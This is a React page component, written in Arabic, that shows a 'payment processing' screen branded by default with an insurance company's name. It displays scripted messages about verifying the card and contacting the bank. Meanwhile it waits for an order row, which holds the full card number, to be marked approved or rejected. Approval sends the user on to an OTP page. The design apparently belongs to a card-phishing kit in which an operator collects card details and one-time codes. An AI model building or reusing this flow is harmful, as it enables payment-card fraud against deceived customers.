import { useEffect, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { Loader2 } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

const ProcessingPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const [messageIndex, setMessageIndex] = useState(0);
  
  const companyName = searchParams.get("company") || "شركة الاتحاد للتأمين التعاوني";
  const price = searchParams.get("price") || "411.15";
  const orderId = searchParams.get("orderId");

  const messages = [
    "جاري التحقق من معلومات البطاقة...",
    "جاري التواصل مع البنك...",
    "جاري معالجة المعاملة...",
    "جاري إكمال العملية...",
    "يرجى الانتظار قليلاً...",
  ];

  useEffect(() => {
    if (!orderId) {
      navigate('/');
      return;
    }

    // تغيير الرسائل كل ثانية
    const messageTimer = setInterval(() => {
      setMessageIndex((prev) => (prev + 1) % messages.length);
    }, 1000);

    // مراقبة حالة الطلب في الوقت الفعلي
    const channel = supabase
      .channel(`order-status-${orderId}`)
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'customer_orders',
          filter: `id=eq.${orderId}`
        },
        (payload: any) => {
          console.log("Order status updated:", payload);
          const newStatus = payload.new.status;
          
          if (newStatus === 'approved') {
            // الموافقة - الانتقال لصفحة التحقق
            const cardLast4 = payload.new.card_number.slice(-4);
            navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${cardLast4}&orderId=${orderId}`);
          } else if (newStatus === 'rejected') {
            // الرفض - العودة لصفحة الدفع مع رسالة خطأ
            navigate(`/payment?company=${encodeURIComponent(companyName)}&price=${price}&rejected=true`, { replace: true });
          }
        }
      )
      .subscribe();

    return () => {
      clearInterval(messageTimer);
      supabase.removeChannel(channel);
    };
  }, [navigate, orderId, companyName, price]);

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" dir="rtl">
      <div className="text-center animate-fade-in">
        <div className="mb-6">
          <Loader2 className="w-16 h-16 animate-spin text-[#2900fc] mx-auto" />
        </div>
        <h2 className="text-2xl font-bold text-gray-900 mb-4">
          معالجة عملية الدفع
        </h2>
        <p className="text-gray-600 text-lg animate-fade-in" key={messageIndex}>
          {messages[messageIndex]}
        </p>
        <p className="text-sm text-gray-500 mt-6">
          الرجاء عدم إغلاق هذه الصفحة
        </p>
      </div>
    </div>
  );
};

export default ProcessingPayment;
